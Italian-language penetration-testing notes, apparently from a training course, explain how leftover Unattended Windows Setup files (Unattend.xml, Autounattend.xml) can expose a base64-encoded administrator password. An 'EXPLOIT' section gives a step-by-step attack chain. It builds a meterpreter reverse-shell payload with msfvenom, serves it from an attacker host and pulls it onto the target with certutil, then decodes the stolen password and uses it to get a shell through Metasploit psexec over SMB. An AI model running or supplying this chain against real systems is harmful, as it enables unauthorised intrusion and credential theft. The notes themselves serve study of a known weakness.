Windows può **automatizzare** una serie di **attività ripetitive**, come il rollout di massa o
**l'installazione** di **Windows su molti sistemi.**

- Questo avviene in genere **attraverso** l'uso **dell'utility Unattended Windows** **Setup**
per **automatizzare l'installazione**/deployment di massa di **Windows** **sui** **sistemi**.
- Questo strumento **utilizza file** di **configurazione** che **contengono** configurazioni specifiche
e **credenziali** dell'account utente, in particolare la password dell'account **amministratore**.
- Se i **file** di configurazione di Unattended Windows Setup vengono **lasciati sul sistema di
destinazione dopo l'installazione**, **possono rivelare** le **credenziali** dell'account utente
che possono essere utilizzate dagli aggressori per autenticarsi legittimamente con
l'obiettivo Window

### **Unattended Windows** **Setup**

- L'utility Unattended Windows Setup **utilizza** in genere **uno** dei **seguenti file** di
configurazione che contengono informazioni sull'account utente e sulla configurazione del
sistema:
    - **C:\Windows\Panther\Unattend.xml**
    - **C:\Windows\Panther\Autounattend.xml**
- Come precauzione di sicurezza, le **password** memorizzate nel file di
configurazione di Unattended Windows Setup possono essere **codificate** in
**base64**.

EXPLOIT

1. **msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=MIO_IP LPORT=NPORT -f exe > payload.exe** creiamo una shell meterpreter
2. **python -m SimpleHTTPServer 80** apriamo un server python per trasferire il payload
3. **certutil -urlcache -f http://IP_SERVER_PYTHON/payload.exe payload.exe** da cmd windows scarichiamo il file dal server creato su Kali
4. service postgresql start && msfconsole -q
5. use multi/handler
    1. set LHOST 
    2. set LPORT porta utilizzato per payload msfvenom
6. ora quando eseguiremo il payload.exe nel sistema windows si aprirà la shell meterpreter sul nostro kali
7. **cd C:\Windows\Panther\**
8. **download unattend.xml** scarichiamo i file contenenti le pass hashate
9. **<Value>HASHITING</Value>** se PlainText è settato su false vuol dire che è codificato base 64. Copiamo L’hashint della password di administrator
10. **nano passoword.txt > HASHITING** compiamo Hash password in un editor di testo
11. **base64 -d password.txt** decodifica la pass
12. **use exploit/windows/smb/psexec**  permette di ottenere shell tramite smb
    - set RHOSTS
    - set SMBUser
    - set SMBPass
